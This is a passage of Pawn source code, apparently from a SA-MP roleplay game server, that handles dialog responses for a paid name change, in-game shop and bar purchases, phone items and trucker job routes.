					{
						new carid = PlayerInfo[playerid][pprcarkey2];
						strmid(CarInfo[carid][cOwner], inputtext, 0, strlen(inputtext), 255);
						vUpdate(carid,cOwnerx);
					}
					if(PlayerInfo[playerid][pPPluscarkey] != 0)
					{
						new carid = PlayerInfo[playerid][pPPluscarkey];
						strmid(CarInfo[carid][cOwner], inputtext, 0, strlen(inputtext), 255);
						vUpdate(carid,cOwnerx);
					}
					if(PlayerInfo[playerid][pPPluscarkey2] != 0)
					{
						new carid = PlayerInfo[playerid][pPPluscarkey2];
						strmid(CarInfo[carid][cOwner], inputtext, 0, strlen(inputtext), 255);
						vUpdate(carid,cOwnerx);
					}
			   		if(PlayerInfo[playerid][pprcarkey] != 0)
					{
						new carid = PlayerInfo[playerid][pprcarkey];
						strmid(CarInfo[carid][cOwner], inputtext, 0, strlen(inputtext), 255);
						vUpdate(carid,cOwnerx);
					}
					if(PlayerInfo[playerid][pCarkey7] != 0)
					{
						new carid = PlayerInfo[playerid][pCarkey7];
						strmid(CarInfo[carid][cOwner], inputtext, 0, strlen(inputtext), 255);
						vUpdate(carid,cOwnerx);
					}
					if(PlayerInfo[playerid][pCarkey8] != 0)
					{
						new carid = PlayerInfo[playerid][pCarkey8];
						strmid(CarInfo[carid][cOwner], inputtext, 0, strlen(inputtext), 255);
						vUpdate(carid,cOwnerx);
					}
					if(PlayerInfo[playerid][pCarkey9] != 0)
					{
						new carid = PlayerInfo[playerid][pCarkey9];
						strmid(CarInfo[carid][cOwner], inputtext, 0, strlen(inputtext), 255);
						vUpdate(carid,cOwnerx);
					}
					if(PlayerInfo[playerid][pCarkey10] != 0)
					{
						new carid = PlayerInfo[playerid][pCarkey10];
						strmid(CarInfo[carid][cOwner], inputtext, 0, strlen(inputtext), 255);
						vUpdate(carid,cOwnerx);
					}
					PlayerInfo[playerid][pPremiumPoints] -= 20;
		 			Update(playerid, pPremiumPointsx);
					new str[128],strings[256],name[30];
					mysql_format(SQL,str,sizeof(str),"UPDATE users SET `name`='%s' WHERE `name`='%s'",inputtext,PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,str,"","");
					GetPlayerName(playerid, name, sizeof(name));
					format(strings, sizeof(strings), "/shop: %s changed his name to %s.",name,inputtext);
					ABroadCast(COLOR_YELLOW,strings,6);
					SetPlayerName(playerid, inputtext);
					SCM(playerid,COLOR_ERROR,"You kicked for database synchronization, please relogin.");
					KickEx(playerid);
			}
			else
			{
				SendClientMessage(playerid, COLOR_ERROR,"Invalid new nickname.");
			}
		}
	}
	if(dialogid == DIALOG_SEXSHOP)
	{
		if(response)
		{
			if(listitem == 0)
			{
				if(GetPlayerCash(playerid) <= 99) return SendClientMessage(playerid, COLOR_GREY, "You don't have enough money.");
				new str[184];
				GivePlayerCash(playerid,-100);
				BizzInfo[InBussines[playerid]][bTill] += 100;
				mysql_format(SQL,str,sizeof(str),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='%d'",BizzInfo[InBussines[playerid]][bTill],InBussines[playerid]);
				mysql_tquery(SQL,str,"","");
				GameTextForPlayer(playerid, "~r~-$100", 3000, 1);
				GivePlayerWeaponEx(playerid, 10, 1);
			}
			if(listitem == 1)
			{
				if(GetPlayerCash(playerid) <= 99) return SendClientMessage(playerid, COLOR_GREY, "You don't have enough money.");
				new str[184];
				GivePlayerCash(playerid,-100);
				BizzInfo[InBussines[playerid]][bTill] += 100;
				mysql_format(SQL,str,sizeof(str),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='%d'",BizzInfo[InBussines[playerid]][bTill],InBussines[playerid]);
				mysql_tquery(SQL,str,"","");
				GameTextForPlayer(playerid, "~r~-$100", 3000, 1);
				GivePlayerWeaponEx(playerid, 11, 1);
			}
			if(listitem == 2)
			{
				if(GetPlayerCash(playerid) <= 99) return SendClientMessage(playerid, COLOR_GREY, "You don't have enough money.");
				new str[184];
				GivePlayerCash(playerid,-100);
				BizzInfo[InBussines[playerid]][bTill] += 100;
				mysql_format(SQL,str,sizeof(str),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='%d'",BizzInfo[InBussines[playerid]][bTill],InBussines[playerid]);
				mysql_tquery(SQL,str,"","");
				GameTextForPlayer(playerid, "~r~-$100", 3000, 1);
				GivePlayerWeaponEx(playerid, 13, 1);
			}
			if(listitem == 3)
			{
				if(GetPlayerCash(playerid) <= 99) return SendClientMessage(playerid, COLOR_GREY, "You don't have enough money.");
				new str[184];
				GivePlayerCash(playerid,-100);
				BizzInfo[InBussines[playerid]][bTill] += 100;
				mysql_format(SQL,str,sizeof(str),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='%d'",BizzInfo[InBussines[playerid]][bTill],InBussines[playerid]);
				mysql_tquery(SQL,str,"","");
				GameTextForPlayer(playerid, "~r~-$100", 3000, 1);
				GivePlayerWeaponEx(playerid, 12, 1);
			}
			if(listitem == 4)
			{
				if(GetPlayerCash(playerid) <= 149) return SendClientMessage(playerid, COLOR_GREY, "You don't have enough money.");
				new str[184];
				GivePlayerCash(playerid,-150);
				BizzInfo[InBussines[playerid]][bTill] += 150;
				mysql_format(SQL,str,sizeof(str),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='%d'",BizzInfo[InBussines[playerid]][bTill],InBussines[playerid]);
				mysql_tquery(SQL,str,"","");
				GameTextForPlayer(playerid, "~r~-$150", 3000, 1);
				GivePlayerWeaponEx(playerid, 14, 1);
			}
		}
		return 1;
	}
	if(dialogid == DIALOG_BAR)
	{
		if(response)
		{
			if(listitem == 0)
			{
				if(GetPlayerCash(playerid) <= 49) return SendClientMessage(playerid, COLOR_GREY, "You don't have enough money.");
				new str[184];
				GivePlayerCash(playerid,-50);
				BizzInfo[InBussines[playerid]][bTill] += 50;
				mysql_format(SQL,str,sizeof(str),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='%d'",BizzInfo[InBussines[playerid]][bTill],InBussines[playerid]);
				mysql_tquery(SQL,str,"","");
				GameTextForPlayer(playerid, "~r~-$50", 3000, 1);
				SetPlayerSpecialAction(playerid, SPECIAL_ACTION_SMOKE_CIGGY);
			}
			if(listitem == 1)
			{
				if(GetPlayerCash(playerid) <= 49) return SendClientMessage(playerid, COLOR_GREY, "You don't have enough money.");
				new str[184];
				GivePlayerCash(playerid,-50);
				BizzInfo[InBussines[playerid]][bTill] += 50;
				mysql_format(SQL,str,sizeof(str),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='%d'",BizzInfo[InBussines[playerid]][bTill],InBussines[playerid]);
				mysql_tquery(SQL,str,"","");
				GameTextForPlayer(playerid, "~r~-$50", 3000, 1);
				SetPlayerSpecialAction(playerid, SPECIAL_ACTION_DRINK_SPRUNK);
			}
			if(listitem == 2)
			{
				if(GetPlayerCash(playerid) <= 59) return SendClientMessage(playerid, COLOR_GREY, "You don't have enough money.");
				if(PlayerDrunk[playerid] > 9) return SendClientMessage(playerid, COLOR_SERVER, "You are drunk.");
				new str[184];
				GivePlayerCash(playerid,-60);
				BizzInfo[InBussines[playerid]][bTill] += 60;
				mysql_format(SQL,str,sizeof(str),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='%d'",BizzInfo[InBussines[playerid]][bTill],InBussines[playerid]);
				mysql_tquery(SQL,str,"","");
				GameTextForPlayer(playerid, "~r~-$60", 3000, 1);
				SetPlayerSpecialAction(playerid, SPECIAL_ACTION_DRINK_BEER);
				PlayerDrunk[playerid] += 1;
			}
			if(listitem == 3)
			{
				if(GetPlayerCash(playerid) <= 99) return SendClientMessage(playerid, COLOR_GREY, "You don't have enough money.");
				if(PlayerDrunk[playerid] > 9) return SendClientMessage(playerid, COLOR_SERVER, "You are drunk.");
				new str[184];
				GivePlayerCash(playerid,-100);
				BizzInfo[InBussines[playerid]][bTill] += 100;
				mysql_format(SQL,str,sizeof(str),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='%d'",BizzInfo[InBussines[playerid]][bTill],InBussines[playerid]);
				mysql_tquery(SQL,str,"","");
				GameTextForPlayer(playerid, "~r~-$100", 3000, 1);
				SetPlayerSpecialAction(playerid, SPECIAL_ACTION_DRINK_WINE);
				PlayerDrunk[playerid] += 1;
			}
		}
		return 1;
	}
    if(dialogid == Dialog_24)
	{
	    if(response)
	    {
	        new bid = InBussines[playerid];
			if(listitem == 0)
			{
				if(PlayerInfo[playerid][pPhone] == 1 && PlayerInfo[playerid][pPnumber] >= 1000) return SCM(playerid, COLOR_SERVER, ""); 
				if(GetPlayerCash(playerid) <= 499) return SendClientMessage(playerid, COLOR_GREY, "You don't have enough money.");
			    new randphone = 1000000 + random(999999);
			    new query[256];
				format(query, 256, "SELECT * FROM `users` WHERE `PhoneNr` = '%d' ORDER BY `id` ASC", randphone);
				new Cache: res = mysql_query(SQL, query);
				if(cache_get_row_count() != 0)
				{
					SendClientMessage(playerid, COLOR_SERVER, "Tasteaza iarasi [/buy], se pare ca acest numar este luat.");
					return 1;
				}
				new str[184];
			    GivePlayerCash(playerid,-500);
				BizzInfo[bid][bTill] += 500;
    			mysql_format(SQL,str,sizeof(str),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='%d'",BizzInfo[bid][bTill],bid);
				mysql_tquery(SQL,str,"","");
			    GameTextForPlayer(playerid, "~r~-$500", 3000, 1);
		    	PlayerInfo[playerid][pPnumber] = randphone;
			    format(string, sizeof(string), "You have purchased a cell phone! Your number is %d.", randphone);
			    SendClientMessage(playerid, COLOR_SERVER, string);
				mysql_format(SQL,str,sizeof(str),"UPDATE users SET `Money`='%d',`PhoneNr`='%d' WHERE `name`='%s'",GetPlayerCash(playerid),PlayerInfo[playerid][pPnumber],PlayerInfo[playerid][pNormalName]);
				mysql_tquery(SQL,str,"","");
				cache_delete(res);
			    return 1;
            }
			if(listitem == 1)
			{
				if(GetPlayerCash(playerid) <= 49) return SendClientMessage(playerid, COLOR_GREY, "You don't have enough money.");
			    GivePlayerCash(playerid,-50);
				BizzInfo[bid][bTill] += 50;
			    GameTextForPlayer(playerid, "~r~-$50", 3000, 1);
                PlayerInfo[playerid][pPhoneBook] = 1;
			    SendClientMessage(playerid, COLOR_SERVER, "You have purchased a phonebook. Use /number to trace a number down!");
	 	 		new str[184];
				mysql_format(SQL,str,sizeof(str),"UPDATE users SET `Money`='%d',`Phonebook`='%d' WHERE `name`='%s'",GetPlayerCash(playerid),PlayerInfo[playerid][pPhoneBook],PlayerInfo[playerid][pNormalName]);
				mysql_tquery(SQL,str,"","");
				mysql_format(SQL,str,sizeof(str),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='%d'",BizzInfo[bid][bTill],bid);
				mysql_tquery(SQL,str,"","");
			    return 1;
            }
			if(listitem == 2)
	    	{
				if(GetPlayerCash(playerid) <= 499) return SendClientMessage(playerid, COLOR_GREY, "You don't have enough money.");
				if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
				if(PlayerInfo[playerid][pCredits] > 1000) return SCM(playerid,COLOR_SERVER,"{FFB870}You have too many credits.");
				if(GetPlayerCash(playerid) < 500) return SCM(playerid,COLOR_SERVER,"{FFB870}You do not have the money you need.");
				GivePlayerCash(playerid, - 500);
    		    BizzInfo[bid][bTill] += 500;
			    PlayerInfo[playerid][pCredits] += 300;
			    GameTextForPlayer(playerid, "~r~-$500", 3000, 1);
				SCM(playerid,COLOR_SERVER,"You have purchased a phone credit voucher.");
				Update(playerid, pCashx);
				Update(playerid, pCreditsx);
				new str[184];
				mysql_format(SQL,str,sizeof(str),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='%d'",BizzInfo[bid][bTill],bid);
				mysql_tquery(SQL,str,"","");
				return 1;
			}
	    	if(listitem == 3)
			{
				if(GetPlayerCash(playerid) <= 1999) return SendClientMessage(playerid, COLOR_GREY, "You don't have enough money.");
    		    GivePlayerCash(playerid, - 2000);
    		    BizzInfo[bid][bTill] += 2000;
		        PlayerInfo[playerid][pWTalkie] = 1;
			    GameTextForPlayer(playerid, "~r~-$2,000", 3000, 1);
			    SendClientMessage(playerid, COLOR_SERVER, "You have purchased a walkie talkie - use /setfrequency to tune it, and /wt to speak.");
	 	 		new str[184];
				mysql_format(SQL,str,sizeof(str),"UPDATE users SET `Money`='%d',`WTalkie`='1' WHERE `name`='%s'",GetPlayerCash(playerid),PlayerInfo[playerid][pNormalName]);
				mysql_tquery(SQL,str,"","");
				mysql_format(SQL,str,sizeof(str),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='%d'",BizzInfo[bid][bTill],bid);
				mysql_tquery(SQL,str,"","");
			    return 1;
	    	}
			if(listitem == 4)
			{
				if(GetPlayerCash(playerid) <= 1999) return SendClientMessage(playerid, COLOR_GREY, "You don't have enough money.");
    		    GivePlayerCash(playerid, - 2000);
    		    BizzInfo[bid][bTill] += 2000;
			    GameTextForPlayer(playerid, "~r~-$2,000", 3000, 1);
			    SendClientMessage(playerid, COLOR_SERVER, "You have purchased a digital camera.");
				GivePlayerWeaponEx(playerid, 43, 60);
	 	 		new str[184];
				mysql_format(SQL,str,sizeof(str),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='%d'",BizzInfo[bid][bTill],bid);
				mysql_tquery(SQL,str,"","");
			    return 1;
	    	}
			if(listitem == 5)
			{
				if(GetPlayerCash(playerid) <= 4999) return SendClientMessage(playerid, COLOR_GREY, "You don't have enough money.");
    		    GivePlayerCash(playerid, - 5000);
    		    BizzInfo[bid][bTill] += 5000;
			    GameTextForPlayer(playerid, "~r~-$5,000", 3000, 1);
			    SendClientMessage(playerid, COLOR_SERVER, "You have purchased a gas can.");
				PlayerInfo[playerid][pGasCan] = 1;
				Update(playerid, pGasCanx);
	 	 		new str[184];
				mysql_format(SQL,str,sizeof(str),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='%d'",BizzInfo[bid][bTill],bid);
				mysql_tquery(SQL,str,"","");
			    return 1;
	    	}
			else
    		{
		    	SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You don't have the cash for that.");
			}
		}
    	return 1;
	}
	if(dialogid == DIALOG_CANCELJOB)
	{
	    if(response)
	    {
	        Trucker[playerid] = 0;
	        Trucker2[playerid] = 0;
	        DestroyVehicle(viddd[playerid]);
	        viddd[playerid] = 0;
	        SetVehicleToRespawn(TruckID[playerid]);
	        TruckID[playerid] = 0;
	        DisablePlayerCheckpoint(playerid);
	        SendClientMessage(playerid, COLOR_SERVER, "You have disabled your current checkpoint.");
		}
		return 1;
	}
	if(dialogid == DIALOG_TRUCKSELECTX)
	{
	    if(response)
	    {
			if(Trucker4[playerid] == 1)
			{
                SetTimerEx("Truckerr1", 200, 0, "i",playerid);
			}
			else if(Trucker4[playerid] == 2)
			{
			    SetTimerEx("Truckerr2", 200, 0, "i",playerid);
			}
			else if(Trucker4[playerid] == 3)
			{
			    SetTimerEx("Truckerr3", 200, 0, "i",playerid);
			}
			else if(Trucker4[playerid] == 4)
			{
			    SetTimerEx("Truckerr4", 200, 0, "i",playerid);
			}
			Trucker4[playerid] = 0;
		}
		return 1;
	}
	if(dialogid == DIALOG_TRUCKSELECT)
	{
	    if(response)
	    {
	        new Float:pX,Float:pY,Float:pZ,Float:vA;
			GetPlayerPos(playerid,pX,pY,pZ);
			GetVehicleZAngle(GetPlayerVehicleID(playerid),vA);
			SetTimerEx("AttachTrailerrr", 1000, 0, "i", playerid);
			Trucker2[playerid] = 0;
			SendClientMessage(playerid, COLOR_BLUE, "Go to Checkpoint on minimap to deliver goods.");
			DisablePlayerCheckpoint(playerid);
	        if(Trucker3[playerid] == 1)
	        {
	            SetPlayerCheckpoint(playerid,CHKTruck[2][0],CHKTruck[2][1],CHKTruck[2][2],5.0);
				viddd[playerid] = CreateVehicle(435, pX+6, pY+6, pZ+6, vA, -1, -1, -1);
				Trucker[playerid] = 1;
			}
			else if(Trucker3[playerid] == 2)
			{
			    SetPlayerCheckpoint(playerid,CHKTruck[4][0],CHKTruck[4][1],CHKTruck[4][2],5.0);
				viddd[playerid] = CreateVehicle(450, pX+6, pY+6, pZ+6, vA, -1, -1, -1);
				Trucker[playerid] = 2;
			}
			else if(Trucker3[playerid] == 3)
			{
			    SetPlayerCheckpoint(playerid,CHKTruck[11][0],CHKTruck[11][1],CHKTruck[11][2],5.0);
				viddd[playerid] = CreateVehicle(450, pX+6, pY+6, pZ+6, vA, -1, -1, -1);
				Trucker[playerid] = 3;
			}
			else if(Trucker3[playerid] == 4)
			{
			    SetPlayerCheckpoint(playerid,CHKTruck[10][0],CHKTruck[10][1],CHKTruck[10][2],5.0);
				viddd[playerid] = CreateVehicle(450, pX+6, pY+6, pZ+6, vA, -1, -1, -1);
				Trucker[playerid] = 4;
			}
			else if(Trucker3[playerid] == 5)
			{
			    SetPlayerCheckpoint(playerid,CHKTruck[7][0],CHKTruck[7][1],CHKTruck[7][2],5.0);
				viddd[playerid] = CreateVehicle(435, pX+6, pY+6, pZ+6, vA, -1, -1, -1);
				Trucker[playerid] = 5;
			}
			else if(Trucker3[playerid] == 6)
			{
			    SetPlayerCheckpoint(playerid,CHKTruck[6][0],CHKTruck[6][1],CHKTruck[6][2],5.0);
				viddd[playerid] = CreateVehicle(584, pX+6, pY+6, pZ+6, vA, -1, -1, -1);
				SetVehicleHealth(GetPlayerVehicleID(playerid), 315);
				Trucker[playerid] = 6;
			}
			else if(Trucker3[playerid] == 7)
			{
			    SetPlayerCheckpoint(playerid,CHKTruck[8][0],CHKTruck[8][1],CHKTruck[8][2],5.0);
				viddd[playerid] = CreateVehicle(435, pX+6, pY+6, pZ+6, vA, -1, -1, -1);
				Trucker[playerid] = 7;
			}
			else if(Trucker3[playerid] == 8)
			{
			    SetPlayerCheckpoint(playerid,CHKTruck[9][0],CHKTruck[9][1],CHKTruck[9][2],5.0);
				viddd[playerid] = CreateVehicle(435, pX+6, pY+6, pZ+6, vA, -1, -1, -1);
				Trucker[playerid] = 8;
			}
			else if(Trucker3[playerid] == 9)
			{
			    SetPlayerCheckpoint(playerid,CHKTruck[3][0],CHKTruck[3][1],CHKTruck[3][2],5.0);
				viddd[playerid] = CreateVehicle(435, pX+6, pY+6, pZ+6, vA, -1, -1, -1);
				Trucker[playerid] = 9;
			}
			else if(Trucker3[playerid] == 10)
			{
			    SetPlayerCheckpoint(playerid,CHKTruck[5][0],CHKTruck[5][1],CHKTruck[5][2],5.0);
				viddd[playerid] = CreateVehicle(450, pX+6, pY+6, pZ+6, vA, -1, -1, -1);
				Trucker[playerid] = 10;
			}
			else if(Trucker3[playerid] == 11)
			{
			    SetPlayerCheckpoint(playerid,CHKTruck[12][0],CHKTruck[12][1],CHKTruck[12][2],5.0);
				viddd[playerid] = CreateVehicle(435, pX+6, pY+6, pZ+6, vA, -1, -1, -1);
				Trucker[playerid] = 11;
			}
			else if(Trucker3[playerid] == 12)
			{
			    SetPlayerCheckpoint(playerid,CHKTruck[13][0],CHKTruck[13][1],CHKTruck[13][2],5.0);
				viddd[playerid] = CreateVehicle(584, pX+6, pY+6, pZ+6, vA, -1, -1, -1);
				SetVehicleHealth(GetPlayerVehicleID(playerid), 315);
				Trucker[playerid] = 12;
			}
			else if(Trucker3[playerid] == 13)
			{
			    SetPlayerCheckpoint(playerid,CHKTruck[17][0],CHKTruck[17][1],CHKTruck[17][2],5.0);
				viddd[playerid] = CreateVehicle(435, pX+6, pY+6, pZ+6, vA, -1, -1, -1);
				Trucker[playerid] = 13;
			}
			else if(Trucker3[playerid] == 14)
			{
			    SetPlayerCheckpoint(playerid,CHKTruck[15][0],CHKTruck[15][1],CHKTruck[15][2],5.0);
				viddd[playerid] = CreateVehicle(450, pX+6, pY+6, pZ+6, vA, -1, -1, -1);
				Trucker[playerid] = 14;
			}
			else if(Trucker3[playerid] == 15)
			{
			    SetPlayerCheckpoint(playerid,CHKTruck[16][0],CHKTruck[16][1],CHKTruck[16][2],5.0);
				viddd[playerid] = CreateVehicle(450, pX+6, pY+6, pZ+6, vA, -1, -1, -1);
				Trucker[playerid] = 15;
			}
			else if(Trucker3[playerid] == 16)
			{
			    SetPlayerCheckpoint(playerid,CHKTruck[14][0],CHKTruck[14][1],CHKTruck[14][2],5.0);
				viddd[playerid] = CreateVehicle(435, pX+6, pY+6, pZ+6, vA, -1, -1, -1);
				Trucker[playerid] = 16;
			}
			Trucker3[playerid] = 0;
		}
		else
		{
			SetTimerEx("Truckerr1", 200, 0, "i",playerid);
		}
	}
	if(dialogid == DIALOG_TRUCKSELECT2)
	{
	    if(response)
	    {
     		new Float:pX,Float:pY,Float:pZ,Float:vA;
			GetPlayerPos(playerid,pX,pY,pZ);
			GetVehicleZAngle(GetPlayerVehicleID(playerid),vA);
			SetTimerEx("AttachTrailerrr", 1000, 0, "i", playerid);
			Trucker2[playerid] = 0;
			SendClientMessage(playerid, COLOR_BLUE, "Go to Checkpoint on minimap to deliver goods.");
			DisablePlayerCheckpoint(playerid);
			if(Trucker3[playerid] == 1)
	        {
	            SetPlayerCheckpoint(playerid,CHKTruck[11][0],CHKTruck[11][1],CHKTruck[11][2],5.0);
				viddd[playerid] = CreateVehicle(450, pX+6, pY+6, pZ+6, vA, -1, -1, -1);
				Trucker[playerid] = 3;
			}
			else if(Trucker3[playerid] == 2)
	        {
	            SetPlayerCheckpoint(playerid,CHKTruck[10][0],CHKTruck[10][1],CHKTruck[10][2],5.0);
				viddd[playerid] = CreateVehicle(450, pX+6, pY+6, pZ+6, vA, -1, -1, -1);
				Trucker[playerid] = 4;
			}
			else if(Trucker3[playerid] == 3)
	        {
	            SetPlayerCheckpoint(playerid,CHKTruck[7][0],CHKTruck[7][1],CHKTruck[7][2],5.0);
				viddd[playerid] = CreateVehicle(435, pX+6, pY+6, pZ+6, vA, -1, -1, -1);
				Trucker[playerid] = 5;
			}
			else if(Trucker3[playerid] == 4)
	        {
	            SetPlayerCheckpoint(playerid,CHKTruck[6][0],CHKTruck[6][1],CHKTruck[6][2],5.0);
				viddd[playerid] = CreateVehicle(584, pX+6, pY+6, pZ+6, vA, -1, -1, -1);
				SetVehicleHealth(GetPlayerVehicleID(playerid), 315);
				Trucker[playerid] = 6;
			}
			else if(Trucker3[playerid] == 5)
	        {
	            SetPlayerCheckpoint(playerid,CHKTruck[8][0],CHKTruck[8][1],CHKTruck[8][2],5.0);
				viddd[playerid] = CreateVehicle(435, pX+6, pY+6, pZ+6, vA, -1, -1, -1);
				Trucker[playerid] = 7;
			}
			else if(Trucker3[playerid] == 6)
	        {
	            SetPlayerCheckpoint(playerid,CHKTruck[9][0],CHKTruck[9][1],CHKTruck[9][2],5.0);
				viddd[playerid] = CreateVehicle(435, pX+6, pY+6, pZ+6, vA, -1, -1, -1);
				Trucker[playerid] = 8;
			}
			else if(Trucker3[playerid] == 7)
	        {
	            SetPlayerCheckpoint(playerid,CHKTruck[0][0],CHKTruck[0][1],CHKTruck[0][2],5.0);
				viddd[playerid] = CreateVehicle(584, pX+6, pY+6, pZ+6, vA, -1, -1, -1);
				SetVehicleHealth(GetPlayerVehicleID(playerid), 315);
				Trucker[playerid] = 17;
			}
			else if(Trucker3[playerid] == 8)
	        {
	            SetPlayerCheckpoint(playerid,CHKTruck[12][0],CHKTruck[12][1],CHKTruck[12][2],5.0);
				viddd[playerid] = CreateVehicle(435, pX+6, pY+6, pZ+6, vA, -1, -1, -1);
				Trucker[playerid] = 11;
			}
			else if(Trucker3[playerid] == 9)
	        {
	            SetPlayerCheckpoint(playerid,CHKTruck[13][0],CHKTruck[13][1],CHKTruck[13][2],5.0);
				viddd[playerid] = CreateVehicle(584, pX+6, pY+6, pZ+6, vA, -1, -1, -1);
				SetVehicleHealth(GetPlayerVehicleID(playerid), 315);
				Trucker[playerid] = 12;
			}
			else if(Trucker3[playerid] == 10)
	        {
	            SetPlayerCheckpoint(playerid,CHKTruck[17][0],CHKTruck[17][1],CHKTruck[17][2],5.0);
				viddd[playerid] = CreateVehicle(435, pX+6, pY+6, pZ+6, vA, -1, -1, -1);
				Trucker[playerid] = 13;
			}
			else if(Trucker3[playerid] == 11)
	        {
	            SetPlayerCheckpoint(playerid,CHKTruck[15][0],CHKTruck[15][1],CHKTruck[15][2],5.0);
				viddd[playerid] = CreateVehicle(450, pX+6, pY+6, pZ+6, vA, -1, -1, -1);
				Trucker[playerid] = 14;
			}
			else if(Trucker3[playerid] == 12)
	        {
	            SetPlayerCheckpoint(playerid,CHKTruck[16][0],CHKTruck[16][1],CHKTruck[16][2],5.0);
				viddd[playerid] = CreateVehicle(450, pX+6, pY+6, pZ+6, vA, -1, -1, -1);
				Trucker[playerid] = 15;
			}
			Trucker3[playerid] = 0;
		}
		else
		{
			SetTimerEx("Truckerr2", 200, 0, "i",playerid);
		}
	}
	if(dialogid == DIALOG_TRUCKSELECT3)
	{
	    if(response)
	    {
	        new Float:pX,Float:pY,Float:pZ,Float:vA;
			GetPlayerPos(playerid,pX,pY,pZ);
			GetVehicleZAngle(GetPlayerVehicleID(playerid),vA);
			SetTimerEx("AttachTrailerrr", 1000, 0, "i", playerid);
			Trucker2[playerid] = 0;
			SendClientMessage(playerid, COLOR_BLUE, "Go to Checkpoint on minimap to deliver goods.");
			DisablePlayerCheckpoint(playerid);
	        if(Trucker3[playerid] == 1)
	        {
	            SetPlayerCheckpoint(playerid,CHKTruck[2][0],CHKTruck[2][1],CHKTruck[2][2],5.0);
				viddd[playerid] = CreateVehicle(435, pX+6, pY+6, pZ+6, vA, -1, -1, -1);
				Trucker[playerid] = 1;
			}
			else if(Trucker3[playerid] == 2)
	        {
	            SetPlayerCheckpoint(playerid,CHKTruck[4][0],CHKTruck[4][1],CHKTruck[4][2],5.0);
				viddd[playerid] = CreateVehicle(450, pX+6, pY+6, pZ+6, vA, -1, -1, -1);
				Trucker[playerid] = 2;
			}
			else if(Trucker3[playerid] == 3)
	        {
	            SetPlayerCheckpoint(playerid,CHKTruck[3][0],CHKTruck[3][1],CHKTruck[3][2],5.0);
				viddd[playerid] = CreateVehicle(435, pX+6, pY+6, pZ+6, vA, -1, -1, -1);
				Trucker[playerid] = 9;
			}
			else if(Trucker3[playerid] == 4)
	        {
	            SetPlayerCheckpoint(playerid,CHKTruck[5][0],CHKTruck[5][1],CHKTruck[5][2],5.0);
				viddd[playerid] = CreateVehicle(450, pX+6, pY+6, pZ+6, vA, -1, -1, -1);
				Trucker[playerid] = 10;
			}
			else if(Trucker3[playerid] == 5)
	        {
	            SetPlayerCheckpoint(playerid,CHKTruck[1][0],CHKTruck[1][1],CHKTruck[1][2],5.0);
				viddd[playerid] = CreateVehicle(435, pX+6, pY+6, pZ+6, vA, -1, -1, -1);
				Trucker[playerid] = 18;
			}
			else if(Trucker3[playerid] == 6)
	        {
	            SetPlayerCheckpoint(playerid,CHKTruck[0][0],CHKTruck[0][1],CHKTruck[0][2],5.0);
				viddd[playerid] = CreateVehicle(584, pX+6, pY+6, pZ+6, vA, -1, -1, -1);
				SetVehicleHealth(GetPlayerVehicleID(playerid), 315);
				Trucker[playerid] = 17;
			}
			else if(Trucker3[playerid] == 7)
	        {
	            SetPlayerCheckpoint(playerid,CHKTruck[12][0],CHKTruck[12][1],CHKTruck[12][2],5.0);
				viddd[playerid] = CreateVehicle(435, pX+6, pY+6, pZ+6, vA, -1, -1, -1);
				Trucker[playerid] = 11;
			}
			else if(Trucker3[playerid] == 8)
	        {
	            SetPlayerCheckpoint(playerid,CHKTruck[13][0],CHKTruck[13][1],CHKTruck[13][2],5.0);
				viddd[playerid] = CreateVehicle(584, pX+6, pY+6, pZ+6, vA, -1, -1, -1);
				SetVehicleHealth(GetPlayerVehicleID(playerid), 315);
				Trucker[playerid] = 12;
			}
			else if(Trucker3[playerid] == 9)
	        {
	            SetPlayerCheckpoint(playerid,CHKTruck[17][0],CHKTruck[17][1],CHKTruck[17][2],5.0);
				viddd[playerid] = CreateVehicle(435, pX+6, pY+6, pZ+6, vA, -1, -1, -1);
				Trucker[playerid] = 13;
			}
			else if(Trucker3[playerid] == 10)
	        {
	            SetPlayerCheckpoint(playerid,CHKTruck[15][0],CHKTruck[15][1],CHKTruck[15][2],5.0);
				viddd[playerid] = CreateVehicle(450, pX+6, pY+6, pZ+6, vA, -1, -1, -1);
				Trucker[playerid] = 14;
			}
			else if(Trucker3[playerid] == 11)
	        {
	            SetPlayerCheckpoint(playerid,CHKTruck[16][0],CHKTruck[16][1],CHKTruck[16][2],5.0);
				viddd[playerid] = CreateVehicle(450, pX+6, pY+6, pZ+6, vA, -1, -1, -1);
				Trucker[playerid] = 15;
			}
			else if(Trucker3[playerid] == 12)
	        {
	            SetPlayerCheckpoint(playerid,CHKTruck[14][0],CHKTruck[14][1],CHKTruck[14][2],5.0);
				viddd[playerid] = CreateVehicle(435, pX+6, pY+6, pZ+6, vA, -1, -1, -1);
				Trucker[playerid] = 16;
			}
			Trucker3[playerid] = 0;
		}
		else
		{
			SetTimerEx("Truckerr3", 200, 0, "i",playerid);
		}
	}
	if(dialogid == DIALOG_TRUCKSELECT4)
	{
	    if(response)
	    {
	        new Float:pX,Float:pY,Float:pZ,Float:vA;
			GetPlayerPos(playerid,pX,pY,pZ);
			GetVehicleZAngle(GetPlayerVehicleID(playerid),vA);
			SetTimerEx("AttachTrailerrr", 1000, 0, "i", playerid);
			Trucker2[playerid] = 0;
			SendClientMessage(playerid, COLOR_BLUE, "Go to Checkpoint on minimap to deliver goods.");
			DisablePlayerCheckpoint(playerid);
	        if(Trucker3[playerid] == 1)
	        {
	            SetPlayerCheckpoint(playerid,CHKTruck[2][0],CHKTruck[2][1],CHKTruck[2][2],5.0);
				viddd[playerid] = CreateVehicle(435, pX+6, pY+6, pZ+6, vA, -1, -1, -1);
				Trucker[playerid] = 1;
			}
			else if(Trucker3[playerid] == 2)
	        {
